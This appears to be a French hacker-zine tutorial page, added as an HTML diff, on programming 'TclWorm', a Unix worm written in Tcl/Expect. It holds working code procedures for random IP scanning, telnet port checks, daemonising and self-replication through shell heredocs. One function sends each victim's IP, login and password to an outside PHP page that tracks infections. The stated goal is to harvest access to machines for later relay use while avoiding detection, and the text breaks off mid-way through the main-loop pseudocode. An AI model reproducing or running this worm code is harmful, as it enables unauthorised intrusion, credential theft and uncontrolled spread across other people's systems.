@@ -1,0 +1,470 @@
+<html>
+<head>
+<title>TclWorm v1.0 by sirius_black</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#000000" text="#FF00FF">
+<div align="center">
+  <p><b><u><font size="6">Programmer un ver</font></u></b></p>
+  <p align="left"><b>Intro<br>
+    </b><font size="2">Depuis quelques temps mon int&eacute;r&ecirc;t s'est tourn&eacute; 
+    vers les vers. Pas vers les macros-virus ou les vers windows comme Sobig, 
+    Blaster etc. mais vers les worm Unix, principalement le Morris Worm.<br>
+    Tout le monde conna&icirc;t l'histoire : <br>
+    Robert Morris Jr. (alias RTM), un &eacute;tudiant de 23 ans &agrave; l'universit&eacute; 
+    de Cornell a cod&eacute; ce ver qui a foutu en rade un tiers du r&eacute;seau 
+    Internet de l'&eacute;poque (d&eacute;but novembre 88).<br>
+    Le p&egrave;re de RTM &eacute;tait le dirigeant du NCSC (National Computer 
+    Security Center) qui est la section de la NSA d&eacute;di&eacute; &agrave; 
+    la s&eacute;curit&eacute; informatique. Son p&egrave;re &eacute;tait un guru 
+    Unix. Il a &eacute;crit de nombreux bouquins sur la s&eacute;curit&eacute; 
+    Unix et d&eacute;couvert pas mal de failles dessus. De nombreuses personnes 
+    ont fait des &eacute;tudes du ver (dans le Phrack#22 par exemple) et c'est 
+    marrant de constater que ces articles font souvent r&eacute;f&eacute;rences 
+    &agrave; plusieurs livres du p&egrave;re de RTM.<br>
+    Mais le plus choquant quand on &eacute;tudie le code de ce ver c'est l'absence 
+    d'instructions malveillantes. Le ver ne fait que se r&eacute;pendre de machines 
+    en machines. Ce qui a caus&eacute; autant de d&eacute;gats c'est une erreur 
+    de codage ou plut&ocirc;t un oubli dans la cr&eacute;ation du ver : le ver 
+    peut r&eacute;attaquer une machine m&ecirc;me si elle est d&eacute;j&agrave; 
+    infect&eacute;e.<br>
+    Par cons&eacute;quence les connexions surchargent le serveur qui n'est plus 
+    capable de loger qui que se soit, m&ecirc;me l'administrateur physiquement 
+    pr&eacute;sent devant le serveur.<br>
+    Je n'entre pas en d&eacute;tail dans la programmation du 'InternetWorm' (une 
+    autre fois peut &ecirc;tre) mais pour moi RTM reste mon mod&egrave;le, le 
+    hacker n&deg;1.<img src="../media/respect.gif" width="43" height="18"><br>
+    RTM, je sais que tu ne liras pas ce mag... (ya peu de chances) mais saches 
+    que je te d&eacute;die ce mag ainsi que mon premier ver qui est dans l'id&eacute;ologie 
+    pas si lointain du tiens.<br>
+    <img src="../media/robertmorris.jpg" width="361" height="359"> <img src="../media/dieu.gif" width="279" height="142"><br>
+    </font>RTM</p>
+  <p align="left"><b>Th&eacute;orie<br>
+    </b><font size="2">Bon on s&egrave;che les larmes et on passe au boulot <img src="../media/pleurs.gif" width="21" height="16"><br>
+    Voici ce que notre ver doit faire : il doit se connecter sur le port Telnet 
+    d'une machine qu'il aura pris tout &agrave; fait au hazard. Si le port est 
+    ouvert il teste les mots de passe par d&eacute;faut. Pour les mots de passes 
+    par d&eacute;faut ya des listes toute faites qui sont r&eacute;guli&egrave;rement 
+    mises &agrave; jour. Ici je prend le fichier dad400.txt. Si un couple login/password 
+    est correct le ver doit nous en informer et infecter la machine &agrave; laquelle 
+    il est conect&eacute;.<br>
+    Une fois qu'il a infect&eacute; cette machine (elle peut fonctionner ind&eacute;pendamment 
+    du ver attaquant), le ver passe &agrave; une machine suivante.<br>
+    Je vais pr&eacute;ciser ici quelques concepts sur le pourquoi du comment le 
+    ver fonctionne.<br>
+    D&eacute;j&agrave; on peut se demander pourquoi c'est le ver qui scanne qui 
+    nous informe qu'il a trouv&eacute; une machine infect&eacute;e et non la machine 
+    infect&eacute;e qui vient nous avertir quelle est infect&eacute;e.<br>
+    La r&eacute;ponse est simple : compatibilit&eacute;. Tous les probl&egrave;mes 
+    que nous aurons en programmant un ver seront d&ucirc; &agrave; la compatibilit&eacute;. 
+    En effet tous les serveurs Telnet n'ont pas le m&ecirc;me prompt, ensuite 
+    toutes les machines n'ont pas telnet, wget etc.<br>
+    Une machine qui lance un scan est forc&eacute;ment correctement infect&eacute;e 
+    donc on peut compter sur elle. Une machine qui vient tout juste de se faire 
+    infecter est moins s&ucirc;re pour nous. D&eacute;j&agrave; parce que Tclsh 
+    n'est pas forc&eacute;ment install&eacute; (je rappelle que l'on va coder 
+    en Tcl/Expect). et que le lancement du worm peut foirer sur cette machine.<br>
+    Notre objectif n'est pas d'infecter le maximum de machines contrairement &agrave; 
+    beaucoup de worms qui commencent par scanner le sous-r&eacute;seau. L'objectif 
+    de notre worm est de r&eacute;cup&eacute;rer des acc&egrave;s sur diff&eacute;rentes 
+    machines qui pourront nous servir de relais ou autre (h&eacute;h&eacute;) 
+    plus tard.<br>
+    Passons &agrave; l'algorithme de ce ver.<br>
+    Tout d'abord on part d'une machine &agrave; laquelle on a un acc&egrave;s 
+    (&eacute;videmment il faut &eacute;viter d'utiliser sa machine si on veut 
+    pas se faire tracer).<br>
+    Le worm est lanc&eacute;.<br>
+    Il doit d'abord regarder si les commandes telnet &amp; wget sont pr&eacute;sentes 
+    sur le syst&egrave;me. Si elles sont pr&eacute;sentes elles vont nous simplifier 
+    la t&acirc;che. Si il manque que wget on peut se rabattre sur telnet uniquement. 
+    Si telnet est aussi absent on peut pr&eacute;voir une voie de secours qui 
+    utilisera les sockets en Tcl (c'est loin d'&ecirc;tre le top).<br>
+    Ces v&eacute;rifications permettent au ver de d&eacute;terminer la fa&ccedil;on 
+    dont il va fonctionner.<br>
+    Dans tous les cas il scanne des ips au hazard (il ne prend pas une plage d'ip, 
+    les adresses qui sont g&eacute;n&eacute;r&eacute;es n'ont aucun rapport entre 
+    elles).<br>
+    On pourra &eacute;ventuellement avoir recours aux socket Tcl pour v&eacute;rifier 
+    que le port 23 est ouvert avant de lancer telnet.<br>
+    Si le port est ouvert on essaye les accounts par d&eacute;faut (le top serait 
+    de d&eacute;terminer le syst&egrave;me sur lequel on est (&agrave; partir 
+    de son prompt) puis de tester les password en cons&eacute;quence).<br>
+    Si on a trouv&eacute; un compte valide, le worm doit appeler une page php 
+    avec comme param&ecirc;tre l'ip de la machine qu'il vient d'infecter (et si 
+    possible le login &amp; password).<br>
+    Cette page php enregistre dans une base de donn&eacute;es l'adresse IP fournie 
+    par le ver. Le script php regarde aussi si la machine &eacute;tait d&eacute;j&agrave; 
+    infect&eacute;e. En fonction de cela la page doit contenir un mot cl&eacute; 
+    qui permettra au worm de savoir si il doit se reproduire sur la nouvelle machine 
+    ou se d&eacute;connecter.<br>
+    Si la machine n'est pas encore infect&eacute;e, il recopie le code du ver 
+    et le lance.<br>
+    Il faut ensuite que le ver se d&eacute;connecte pour passer &agrave; la machine 
+    suivante. Mais cette d&eacute;connexion peut nous poser des probl&egrave;mes. 
+    En effet la d&eacute;connexion peut avoir comme effet de stopper le worm. 
+    Il faut absolument que la machine attaquante se d&eacute;connecte pour qu'un 
+    admin ne voit pas que sa machine est connect&eacute;e &agrave; une autre machine.<br>
+    Les solutions auxquelles j'ai pens&eacute; sont la commande nohup ou bien 
+    le script fraichement install&eacute; qui tuerait son processus p&egrave;re 
+    (la connexion telnet).<br>
+    Une fois d&eacute;connect&eacute; notre machine va recommencer &agrave; scanner 
+    l'Internet &agrave; la recherche d'une autre machine infectable.</font></p>
+  <p align="left"><font size="2">Si vous avez bien lu les articles pr&eacute;c&eacute;dents 
+    (programmation Tcl &amp; Expect) vous avez d&ucirc; devinerque nous allons 
+    r&eacute;utiliser quelques scripts que nous avons vu. Par exemple nous allons 
+    reprendre et modifier le script pour telnet. La plupart des serveurs telnet 
+    envoie les strings '<font color="#00FFFF">ogin:</font>' et '<font color="#00FFFF">assword:</font>' 
+    mais ensuite le prompt peut &ecirc;tre un '<font color="#00FFFF">$</font>' 
+    un '<font color="#00FFFF">#</font>' ou un '<font color="#00FFFF">&gt;</font>' 
+    etc. en fonction de la configuration de la machine. C'est l'une des possibilit&eacute;s 
+    qu'il faudra g&eacute;rer.<br>
+    Pour appeler le script php j'ai pens&eacute; &agrave; wget. Mais il n'est 
+    pas forc&eacute;ment install&eacute;. On peut tr&egrave;s facilement se servir 
+    de telnet pour le remplacer. Si aucun des deux n'est pr&eacute;sent, Tcl fourni 
+    un package http qui peut &ecirc;tre sympa &agrave; utiliser.<br>
+    La reproduction en elle m&ecirc;me <img src="../media/fuck1.gif" width="24" height="20"> 
+    (la recopie du ver) peut aussi poser des probl&egrave;mes. On pourrait encore 
+    avoir recours &agrave; wget ou au package http pour r&eacute;cup&eacute;rer 
+    le ver sur un site internet (solution assez &eacute;l&eacute;gante il faut 
+    l'avouer ;-). Sinon il va faloir parler au shell (par un '<font color="#00FFFF">cat 
+    &gt; ver &lt;&lt; EO</font><font color="#00ffff">F</font>' par exemple) mais 
+    c vraiment le dernier recours :-(.<br>
+    Il va donc falloir coder les diff&eacute;rentes &eacute;tapes et les diff&eacute;rentes 
+    fa&ccedil;ons de faire qui seront appel&eacute;es en fonction des ressources 
+    dispo sur la machine infect&eacute;e.</font></p>
+  <p align="left"><b>Pratique</b></p>
+  <p align="left"><font size="2">Reprise de l'article le 12/12/2003<br>
+    J'ai &eacute;crit l'article en deux fois. La partie ci-dessus &eacute;tait 
+    plut&ocirc;t les questions &agrave; se poser avant de coder le worm. Maintenant 
+    le worm est cod&eacute; et on va pourvoir &eacute;tudier les solutions choisies.</font></p>
+  <p align="left"><font size="2"><u>La d&eacute;connexion</u> <img src="../media/deja_dehors.gif" width="71" height="68"><br>
+    En programmation C, les programmes qui tournent en taches de fond s'apellent 
+    des d&eacute;mons. La fonction daemon() (si mes souvenirs sont bons) permet, 
+    pour le langage C de faire passer son programme en d&eacute;mon. La documentation 
+    nous explique que transformer son programme en d&eacute;mon, c'est le rendre 
+    ind&eacute;pendant de son tty (terminal).<br>
+    Ca tombe bien car en Tcl ya une fonction similaire qui s'apelle <b><font color="#FFFFFF">disconnect</font></b>. 
+    On utilisera donc les deux lignes suivantes :</font></p>
+  <p align="left"><font size="2" color="#FFFFFF">if {[<b>fork</b>]!=0} <b>exit</b><br>
+    <b>disconnect</b></font></p>
+  <p align="left"><font size="2">La premi&egrave;re ligne <b><font color="#FFFFFF">fork</font></b> 
+    (cr&eacute;ation d'un processus fils) un second worm. Le worm fils se d&eacute;clare 
+    ind&eacute;pendant (<b><font color="#FFFFFF">disconnect</font></b>) et le 
+    p&egrave;re se tue avec<b><font color="#FFFFFF"> exit</font></b> (c'est toujours 
+    tr&egrave;s &eacute;thique les processus ;-) </font></p>
+  <p align="left"><font size="2"><u>G&eacute;n&eacute;ration d'une adresse IP 
+    al&eacute;atoire</u><br>
+    Ici nous allons cr&eacute;er une fonction qui renverra l'adresse IP. Une adresse 
+    IP c'est 4 chiffres compris entre 0 et 255. En Tcl il existe une fonction 
+    <font color="#FFFFFF"><b>rand()</b></font> qui donne un chiffre &agrave; virgule 
+    al&eacute;atoire entre 0 et 1.<br>
+    On va fixer le pr&eacute;cision de Tcl &agrave; 3 pour obtenir des nombres 
+    &agrave; 3 chiffres apr&egrave;s la virgule. En multipliant le r&eacute;sultat 
+    obtenu al&eacute;atoirement par 1000 on obtient un nombre entre 0 et 1000 
+    exclu.<br>
+    On doit donc diviser ce nombre par 4 pour avoir un maximum de 250. Certes 
+    on atteint pas les 255 mais c'est pas bien g&eacute;nant.<br>
+    Pour obtenir une adresse IP il faut donc concat&eacute;ner 4 nombres s&eacute;par&eacute;s 
+    par des points. Ce que l'on obtient avec la fonction suivante.</font></p>
+  <p align="left"><font color="#FFFFFF" size="2"><b>proc&nbsp;</b> get_random_ip&nbsp; 
+    {&nbsp;}&nbsp; {<br>
+    &nbsp;&nbsp;<b>set&nbsp;</b> <i>tcl_precision</i> &nbsp;3<br>
+    &nbsp;&nbsp;<b>set</b> &nbsp;ip&nbsp; <font color="#00FFFF">&quot;&quot;</font><br>
+    &nbsp;&nbsp;<b>append&nbsp;</b> ip&nbsp; [<b>expr&nbsp; round</b>((<b>rand()</b>*1000)/4)]<br>
+    &nbsp;&nbsp;<b>for</b> {<b>set&nbsp;</b> i&nbsp; 0} {$i &lt; 3} {<b>incr</b> 
+    &nbsp;i&nbsp; 1} {<br>
+    &nbsp;&nbsp;&nbsp;<b>&nbsp;append</b>&nbsp; ip&nbsp; <font color="#00FFFF">&quot;.&quot;</font><br>
+    &nbsp;&nbsp;&nbsp;&nbsp;<b>append</b> &nbsp;ip&nbsp; [<b>expr&nbsp;</b> <b>round</b>((<b>rand</b>()*1000)/4)]<br>
+    &nbsp;&nbsp;}<br>
+    &nbsp;&nbsp;<b>return</b> &nbsp;$ip<br>
+    }</font></p>
+  <p align="left"><font size="2"><u>V&eacute;rifier que le port Telnet est ouvert</u><br>
+    Plut&ocirc;t que de lancer un telnet et de s'apercevoir que le port telnet 
+    est ferm&eacute;, on utilise les socket Tcl, ce qui est bien plus rapide.</font></p>
+  <p align="left"><font size="2" color="#FFFFFF"><b>proc</b>&nbsp; is_telnet_open&nbsp; 
+    ip &nbsp;{<br>
+    &nbsp;&nbsp;<b>set</b>&nbsp; is_open &nbsp;0<br>
+    &nbsp;<b>&nbsp;if</b>&nbsp; {&nbsp; [<b>catch</b> &nbsp;{<b>set</b>&nbsp; 
+    sock &nbsp;[<b>socket</b>&nbsp; $ip&nbsp; 23]}&nbsp; ]&nbsp; }&nbsp; {<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;<b>set</b> &nbsp;is_open &nbsp;0<br>
+    &nbsp;&nbsp;}&nbsp;<b> else</b>&nbsp; {<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;<b>set</b>&nbsp; is_open &nbsp;1<br>
+    &nbsp;&nbsp;&nbsp;<b>&nbsp;close</b>&nbsp; $sock<br>
+    &nbsp;&nbsp;}<br>
+    &nbsp;&nbsp;<b>return</b> &nbsp;$is_open<br>
+    }</font></p>
+  <p align="left"><font size="2">La fonction prend l'adresse IP comme param&ecirc;tre. 
+    L'ouverture de la connexion se fait avec la commande <b><font color="#FFFFFF">socket</font></b>. 
+    La seule fa&ccedil;on de savoir si la connexion est ouverte ou non se fait 
+    par le biais d'une exception que l'on attrape avec un <b><font color="#FFFFFF">catch</font></b> 
+    (comme en Java). On renvoie 1 si le port est ouvert, 0 sinon.</font></p>
+  <p align="left"><font size="2"><u>Rechecher o&ugrave; se trouve telnet et wget</u><br>
+    Pour cette version du worm je ne me suis pas servi de wget car le package 
+    http de Tcl s'est montr&eacute; performant. Toutefois si le package n'est 
+    pas pr&eacute;sent il peut &ecirc;tre utile d'avoir wget sous la main. Cette 
+    fonction devrait &ecirc;tre &eacute;tendue pour rechercher telnet dans plus 
+    de r&eacute;pertoires (/bin, /usr/local/bin et /sbin par exemple). La fonction 
+    utilise des variables globales au lieu de renvoyer un r&eacute;sultat.</font></p>
+  <p align="left"><font color="#FFFFFF" size="2"><b>proc</b>&nbsp; where_are_progs&nbsp; 
+    {&nbsp;}&nbsp; {<br>
+    <b>&nbsp;&nbsp;global&nbsp;</b> wget_found<br>
+    <b>&nbsp;&nbsp;global</b> &nbsp;telnet_found<br>
+    <b>&nbsp;&nbsp;global&nbsp;</b> wget_path<br>
+    <b>&nbsp;&nbsp;global</b> &nbsp;telnet_path<br>
+    <b>&nbsp;&nbsp;if</b> &nbsp;[<b>file&nbsp;</b> <b>exists</b> &nbsp;<font color="#00FFFF">&quot;/usr/bin/wget&quot;</font>]&nbsp;==&nbsp;1&nbsp; 
+    {<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;</b> wget_found &nbsp;1<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;</b> wget_path <font color="#00FFFF">&nbsp;&quot;/usr/bin/wget&quot;</font><br>
+    &nbsp;&nbsp;}<br>
+    <b>&nbsp;&nbsp;if</b>&nbsp; [<b>file&nbsp;</b> <b>exists&nbsp;</b> <font color="#00FFFF">&quot;/usr/bin/telnet&quot;</font>]==1 
+    &nbsp;{<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set</b> &nbsp;telnet_found &nbsp;1<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set</b> &nbsp;telnet_path&nbsp;<font color="#00FFFF"> 
+    &quot;/usr/bin/telnet&quot;</font><br>
+    &nbsp;&nbsp;}<br>
+    }</font></p>
+  <p align="left"><font size="2"><u>Savoir o&ugrave; se trouve le ver (dans l'arborescence)</u></font></p>
+  <p align="left"><font size="2" color="#FFFFFF"><b>proc&nbsp;</b> whereis_worm&nbsp; 
+    {&nbsp;}&nbsp; {<br>
+    <b>&nbsp;&nbsp;set&nbsp;</b> worm_path&nbsp; [<b>pwd</b>]<br>
+    <b>&nbsp;&nbsp;set&nbsp;</b> file_name&nbsp; [<b>lindex</b> &nbsp;[<b>split&nbsp;</b> 
+    [<b>info&nbsp;</b> <b>script</b>]&nbsp;<font color="#00FFFF"> &quot;/&quot;</font>]&nbsp; 
+    <b>end</b>]<br>
+    <b>&nbsp;&nbsp;append</b>&nbsp; worm_path&nbsp;<font color="#00FFFF"> &quot;/&quot;</font> 
+    &nbsp;$file_name<br>
+    <b>&nbsp;&nbsp;return</b> &nbsp;$worm_path<br>
+    }</font></p>
+  <p align="left"><font size="2">La commande <b><font color="#FFFFFF">pwd</font></b> 
+    permet de savoir dans quel r&eacute;pertoire se trouve le vers. La commande<b><font color="#FFFFFF"> 
+    info script</font></b> permet de conna&icirc;tre la fa&ccedil;on dont a &eacute;t&eacute; 
+    apell&eacute; le script (par exemple &ccedil;a peut &ecirc;tre ./tcl/prog/tclworm). 
+    On doit donc r&eacute;cup&eacute;rer le mot apr&egrave;s le dernier '/' pour 
+    avoir le nom du fichier. On concat&egrave;ne ensuite les deux r&eacute;sultats 
+    et on renvoie la valeur.</font></p>
+  <p align="left"><font size="2"><u>Reproduction <img src="../media/fuck1.gif" width="24" height="20"></u><br>
+    Pour la r&eacute;plication j'ai finalement d&eacute;cid&eacute; d'utiliser 
+    la commande cat sous le shell. Le probl&egrave;me avec cette m&eacute;thode 
+    c'est que le shell interpr&egrave;te certains caract&egrave;res. Ainsi si 
+    on tappe :</font></p>
+  <p align="left"><font color="#00FF00" size="2">[sirius]$ cat &gt; truc.txt &lt;&lt; 
+    EOF<br>
+    &gt; $x<br>
+    &gt; second line<br>
+    &gt; EOF<br>
+    [sirius]$ cat truc.txt<br>
+    <br>
+    </font><font color="#00FF00" size="2">second line<br>
+    [sirius]$</font></p>
+  <p align="left"><font size="2">On s'appercoit que notre $x n'apparait pas. En 
+    fait c'est le shell qui a fait une substitution de variable. Si on modifie 
+    un peu...</font></p>
+  <p align="left"><font size="2" color="#00FF00">[sirius]$ cat &gt; truc.txt &lt;&lt; 
+    EOF<br>
+    &gt; \$x<br>
+    &gt; second line<br>
+    &gt; EOF<br>
+    [sirius]$ cat truc.txt<br>
+    $x<br>
+    second line<br>
+    [sirius]$</font></p>
+  <p align="left"><font size="2">Ca marche !! Il faut donc mettre un antislash 
+    devant le caract&egrave;re pour l'&eacute;chapper. A &eacute;chapper on a 
+    donc le dollars, les backquotes et on doit doubler les antislashs.<br>
+    Ensuite un gros probl&egrave;me sur lequel j'ai perdu quelques jours : les 
+    tabulations. Sous un shell si vous tappez sur tabulation, Linux vous affiche 
+    les fichiers qui peuvent correspondre &agrave; votre demande (completion). 
+    J'ai mis un certain temps avant de comprendre pourquoi j'avais des listings 
+    de fichiers quand j'essayais de faire marcher le ver. La seule solution que 
+    j'ai trouv&eacute; jusqu'&agrave; pr&eacute;sent c'est de faire un trim pour 
+    supprimer les tabulations. La fonction suivante permet de mettre le ver en 
+    m&eacute;moire et de le formater de telle fa&ccedil;on qu'il puisse &ecirc;tre 
+    envoy&eacute; par le shell.</font></p>
+  <p align="left"><font color="#FFFFFF" size="2"><b>proc&nbsp;</b> get_content&nbsp; 
+    {&nbsp;}&nbsp; {<br>
+    <b>&nbsp;&nbsp;set&nbsp;</b> f&nbsp; [<b>open</b> &nbsp;[whereis_worm]&nbsp;<font color="#00FFFF"> 
+    &quot;r&quot;</font>]<br>
+    <b>&nbsp;&nbsp;set&nbsp;</b> texte&nbsp; <font color="#00FFFF">&quot;&quot;</font><br>
+    <b>&nbsp;&nbsp;while&nbsp;</b> {&nbsp; ![<b>eof&nbsp;</b> $f]&nbsp; }&nbsp; 
+    {<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;</b> ligne&nbsp; [<b>gets&nbsp;</b> $f]<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;</b> ligne&nbsp; [<b>string</b> <b>&nbsp;map</b> 
+    &nbsp;{\\&nbsp; \\\\&nbsp; \$&nbsp; \\\$&nbsp; \`&nbsp; \\\`}&nbsp; $ligne]<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;</b> ligne &nbsp;[<b>string</b> <b>&nbsp;trim</b> 
+    &nbsp;$ligne]<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;append</b> &nbsp;texte&nbsp;<font color="#00FFFF"> 
+    &quot;$ligne\n&quot;</font><br>
+    &nbsp;&nbsp;}<br>
+    <b>&nbsp;&nbsp;close&nbsp;</b> $f<br>
+    <b>&nbsp;&nbsp;return</b> &nbsp;$texte<br>
+    }</font></p>
+  <p align="left"><font size="2">On ouvre le worm en lecture. On lit une ligne. 
+    On &eacute;chappe les antislashes, les dollars et les backquotes. On retire 
+    aussi l'indentation (les tabulations) avec la fonction trim. On concat&egrave;ne 
+    le r&eacute;sultat dans la variable $texte et on recommence avec la ligne 
+    suivante et ce jusqu'&agrave; la fin.</font></p>
+  <p align="left"><font size="2"><u>Deux fonctions qui peuvent (peut-&ecirc;tre) 
+    servir</u><br>
+    Je sais plus trop o&ugrave; j'ai trouv&eacute; ces fonctions. La premi&egrave;re 
+    renvoie l'adresse IP de la machine o&ugrave; on se trouve et l'autre l'adresse 
+    du r&eacute;seau sur lequel on est. Je ne me sert pas de ces fonctions mais 
+    elles peuvent utiles si on souhaite attaquer le sous-r&eacute;seau (une autre 
+    version du ver par exemple).</font></p>
+  <p align="left"><font size="2" color="#FFFFFF"><b>proc</b> &nbsp;MyIpaddr&nbsp; 
+    {&nbsp;} &nbsp;{<br>
+    <b>&nbsp;&nbsp;set&nbsp;</b> addr&nbsp;<font color="#00FFFF"> &quot;&quot;</font><br>
+    <b>&nbsp;&nbsp;if&nbsp;</b> {[<b>catch&nbsp;</b> {<b>dns&nbsp;</b> <b>address</b> 
+    &nbsp;[<b>info&nbsp; hostname</b>]}&nbsp; addr]} {<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;</b> server&nbsp; [<b>socket</b> &nbsp;-server 
+    &nbsp;# &nbsp;0]<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set</b> &nbsp;port&nbsp; [<b>lindex&nbsp;</b> [<b>fconfigure&nbsp;</b> 
+    $server&nbsp; -sockname]&nbsp; 2]<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;</b> host&nbsp; [<b>lindex&nbsp;</b> [<b>fconfigure&nbsp;</b> 
+    $server &nbsp;-sockname] &nbsp;1]<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;</b> client&nbsp; [<b>socket</b> &nbsp;$host&nbsp; 
+    $port]<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;</b> addr&nbsp; [<b>lindex&nbsp;</b> [<b>fconfigure</b> 
+    &nbsp;$client &nbsp;-sockname]&nbsp; 0]<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;close&nbsp;</b> $client<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;close&nbsp;</b> $server<br>
+    &nbsp;&nbsp;}<br>
+    <b>&nbsp;&nbsp;return</b> $addr<br>
+    }</font></p>
+  <p align="left"><font size="2" color="#FFFFFF"><b>proc&nbsp;</b> MyNet&nbsp; 
+    {}&nbsp; {<br>
+    <b>&nbsp;&nbsp;set&nbsp;</b> net&nbsp;<font color="#00FFFF"> &quot;&quot;</font><br>
+    <b>&nbsp;&nbsp;regexp</b>&nbsp; {(.*)\..*}&nbsp; [MyIpaddr]&nbsp; {}&nbsp; 
+    net<br>
+    <b>&nbsp;&nbsp;return</b> &nbsp;$net<br>
+    }</font></p>
+  <p align="left"><font size="2"> J'ai pas cherch&eacute; &agrave; comprendre 
+    comment marchaient ces fonctions mais &ccedil;a marche :-)</font></p>
+  <p align="left"><font size="2"><u>Recencement</u><br>
+    L'objectif du worm est de trouver des acc&egrave;s sur des machines. Cela 
+    n'aurait aucune utilit&eacute; si on en &eacute;tait pas inform&eacute;. La 
+    fonction suivante prend en param&ecirc;tre l'adresse ip de la machine en cours 
+    d'infection et le login et le password pour y acc&egrave;der. Elle appelle 
+    alors une page php qui enregistrera les infos dans une base de donn&eacute;es. 
+    En m&ecirc;me temps le script php doit regarder si la machine est ou non d&eacute;j&agrave; 
+    infect&eacute;e. Selon le cas la page php affichera <font color="#00FFFF">&quot;_haxored_&quot;</font> 
+    ou <font color="#00FFFF">&quot;gogetsome&quot;</font>. La fonction renverra<font color="#00FFFF"> 
+    &quot;zut&quot;</font> si il y a eu un probl&egrave;me d'acc&egrave;s &agrave; 
+    la page (pr&eacute;sence d'un firewall, obligation d'utiliser un proxy), <font color="#00FFFF">&quot;next&quot;</font> 
+    si la machine est d&eacute;j&agrave; infect&eacute;e (on doit donc passer 
+    &agrave; une autre machine) ou <font color="#00FFFF">&quot;go&quot;</font> 
+    si la machine n'est pas encore infect&eacute;e.</font></p>
+  <p align="left"><font color="#FFFFFF" size="2"><b>proc&nbsp;</b> declare_becane&nbsp; 
+    {ip&nbsp; login&nbsp; password}&nbsp; {<br>
+    <b>&nbsp;&nbsp;if&nbsp;</b> {![<b>llength</b>&nbsp; [<b>info&nbsp; commands</b> 
+    &nbsp;<font color="#00FFFF">&quot;::http::geturl&quot;</font>]]}&nbsp; {<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;if</b> &nbsp;{[<b>catch</b> &nbsp;{<b>package&nbsp; 
+    require&nbsp;</b> http}]}&nbsp; {<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</b> <font color="#00FFFF">&quot;zut&quot;</font><br>
+    &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+    &nbsp;&nbsp;}<br>
+    <b>&nbsp;&nbsp;::http::config</b>&nbsp; -useragent&nbsp; <font color="#00FFFF">&quot;TCLWORM 
+    v1.0 (LOTFREE)&quot;</font> ;<font color="#FF9900"># Just for the style</font><br>
+    <b>&nbsp;&nbsp;set</b> &nbsp;htmlUrl&nbsp; <font color="#00FFFF">&quot;http://membres.lycos.fr/lotfree/wormstat.php?ip=<font color="#FF0000">$ip</font>&amp;login=<font color="#FF0000">$login</font>&amp;pass=<font color="#FF0000">$password</font>&quot;</font><br>
+    <b>&nbsp;&nbsp;if&nbsp;</b> { [<b>catch</b> &nbsp;{<b> ::http::geturl&nbsp;</b> 
+    $htmlUrl} &nbsp;token]} {<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;return</b> <font color="#00FFFF">&quot;zut&quot;</font><br>
+    &nbsp;&nbsp;}<br>
+    <b>&nbsp;&nbsp;if</b> { [<b>::http::status&nbsp;</b> $token]&nbsp; !=<font color="#00FFFF"> 
+    &quot;ok&quot;</font>} {<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;return</b> <font color="#00FFFF">&nbsp;&quot;zut&quot;</font><br>
+    &nbsp;&nbsp;}<br>
+    <b>&nbsp;&nbsp;set&nbsp;</b> htmlFile&nbsp; [<b>::http::data&nbsp;</b> $token]<br>
+    <b>&nbsp;&nbsp;if&nbsp;</b> {&nbsp; [<b>regexp</b> <font color="#00FFFF">&nbsp;&quot;haxored&quot;</font>&nbsp; 
+    $htmlFile]&nbsp; == 1&nbsp; }&nbsp; {<br>
+    <b>&nbsp;&nbsp;&nbsp;&nbsp;return</b> &nbsp;<font color="#00FFFF">&quot;next&quot;</font><br>
+    &nbsp;&nbsp;}<br>
+    <b>&nbsp;&nbsp;return</b> &nbsp;<font color="#00FFFF">&quot;go&quot;</font><br>
+    }</font></p>
+  <p align="left"><font size="2">La premi&egrave;re &eacute;tape c'est la v&eacute;rification 
+    de la pr&eacute;sence du package HTTP. La deuxi&egrave;me &eacute;tape c'est 
+    l'envoi de la requ&ecirc;te http avec la commande <b><font color="#FFFFFF">::http::geturl</font></b>. 
+    Le r&eacute;sultat est enregistr&eacute; dans une structure d&eacute;sign&eacute;e 
+    ici par la variable $token. On commence par v&eacute;rifier que le code renvoy&eacute; 
+    est <font color="#00FFFF">&quot;ok&quot;</font> et si c'est la cas on r&eacute;cup&egrave;re 
+    la r&eacute;ponse du script php avec<b><font color="#FFFFFF"> ::http::data</font></b>. 
+    On regarde enfin si la r&eacute;ponse contient ou non le texte <font color="#00FFFF">&quot;haxored&quot;</font>.</font></p>
+  <p align="left"><font size="2">Le corps du programme.<br>
+    La source compl&egrave;te est <a href="tclworm.txt" target="_blank">ici</a>.<br>
+    Le ver contient des listes de couples login/password utilis&eacute;s dans 
+    une boucle (une fois qu'on a trouv&eacute; une ip avec le port 23 ouvert).<br>
+    Apr&egrave;s s'&ecirc;tre mis en d&eacute;mon (interract), le programme recherche 
+    o&ugrave; son situ&eacute;s telnet et wget.<br>
+    Le programme entre ensuite dans sa boucle principale :</font></p>
+  <p align="left"><font size="2">tant que 1=1 (boucle infinie) faire<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;obtenir une ip al&eacute;atoire<br>
